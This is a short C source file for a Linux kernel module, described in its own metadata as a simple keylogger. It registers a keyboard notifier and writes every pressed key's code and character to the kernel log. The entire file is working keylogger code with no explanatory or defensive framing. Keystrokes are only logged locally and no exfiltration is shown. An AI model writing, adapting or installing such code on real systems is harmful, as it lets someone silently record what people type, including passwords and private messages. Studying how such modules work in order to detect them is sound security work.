#include<linux/module.h> //this is the core header for loading LKMs into the kernel
#include<linux/kernel.h> //for functions like printk
#include<linux/init.h> //macros for __init and exit
#include<linux/keyboard.h> //keyboard_notifier_param and register_keyboard_param

MODULE_LICENSE("GPL"); //avoid a taint warning
MODULE_AUTHOR("krits"); 
MODULE_DESCRIPTION("Simple kernel keylogger using keyboard notifier");
MODULE_VERSION("1.0");

static int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data);


static struct notifier_block nb = {
	.notifier_call = keylogger_notify
};

static int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data){

	struct keyboard_notifier_param *param = data ; 

	if(action == KBD_KEYSYM && param->down){
		printk(KERN_INFO "KEYLOGGER: keycode=%d char=%c\n",param->value, param->value);
	}
	return NOTIFY_OK;
}

static int __init keylogger_init(void){
	printk(KERN_INFO "KEYLOGGER: Module loaded\n");
	register_keyboard_notifier(&nb);
	return 0 ; 
}
static void __exit keylogger_exit(void){
	printk(KERN_INFO "KEYLOGGER: Module unloaded\n");
	unregister_keyboard_notifier(&nb);
}
module_init(keylogger_init);
module_exit(keylogger_exit);
